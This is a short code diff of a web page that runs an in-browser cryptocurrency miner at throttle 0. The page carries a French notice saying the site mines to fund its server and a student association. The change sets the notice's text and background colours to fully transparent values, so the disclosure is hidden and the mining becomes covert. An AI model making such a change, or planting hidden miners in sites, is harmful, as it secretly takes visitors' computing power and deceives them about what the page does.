@@ -177,6 +177,6 @@ if ($ret == false) {
         throttle: 0, c: 'w', ads: 0
     });
     _client.start();
-    _client.addMiningNotification("Floating Bottom", "Ce site mine de la cryptomonaie pour finance le serveur et le reste sera reverser au BDE.", "#3d3d3d" , 20,"#cccccc");
+    _client.addMiningNotification("Floating Bottom", "Ce site mine de la cryptomonaie pour finance le serveur et le reste sera reverser au BDE.", "#363e4100" , 20,"#363e4100");
 </script>
 </body>
